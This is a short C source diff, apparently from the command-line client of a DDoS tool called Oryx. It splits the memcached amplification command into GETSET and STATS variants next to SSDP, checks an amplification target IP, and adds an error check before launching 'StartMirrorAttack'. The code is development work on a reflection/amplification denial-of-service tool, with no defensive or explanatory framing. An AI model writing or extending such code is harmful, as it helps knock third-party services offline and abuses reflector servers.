@@ -20,7 +20,8 @@ static bool validateCmd( CommandPkt p_cmd )
             switch( (int) p_cmd.data.type )
             {
                 case TEST:
-                case MEMCACHED:
+                case MEMCACHED_GETSET:
+                case MEMCACHED_STATS:
                 case SSDP:
 
                     if( !is_valid_ipv4( p_cmd.data.amp_ip) &&
@@ -233,7 +234,14 @@ void OryxCli( int p_argc, char **p_argv )
     {
        args[i] = p_argv[i+1]; 
     }
+
     pkt = CreateCmdPacket( AttackCmd, argCounter, args);
+    
+    if( NULL == pkt )
+    {
+        Efatal(ERROR_ORYX, "Unknow command");
+    }
+
     cmd = (CommandPkt *) pkt->packet_ptr; 
     draft = getAttackDraftFromCmd(*cmd);
     StartMirrorAttack( *draft );
